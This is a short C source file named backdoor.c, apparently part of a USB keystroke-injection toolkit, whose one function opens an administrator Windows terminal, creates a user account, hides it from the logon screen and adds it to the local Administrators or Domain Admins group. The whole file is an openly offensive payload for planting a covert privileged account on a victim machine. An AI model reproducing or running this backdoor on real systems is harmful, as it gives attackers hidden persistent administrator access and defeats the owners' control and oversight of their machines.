/*
 *  backdoor.c
 *  
 *
 *  Created by Psychosis on 25/05/10.
 *  Copyright 2010 __MyCompanyName__. All rights reserved.
 *
 */

#include "psyduk/includes.h"
#include "payloads/includes.h"

void WACreateBackdoor(const char* name, const char* password, uint8_t realm)
{
	PDOpenWindowsTerminalAsAdministrator();
	WAAddUser(name, password, realm);
	WAHideUserFromLogonScreen(name);
	
	if ( realm == REALM_LOCAL )
	{
		WAAddUserToGroup(name, PSTR("Administrators"), REALM_LOCAL);
	} else if ( realm == REALM_DOMAIN ) {
		WAAddUserToGroup(name, PSTR("Domain Admins"), REALM_DOMAIN);
	}
	
	PDTypeString("exit\n");
}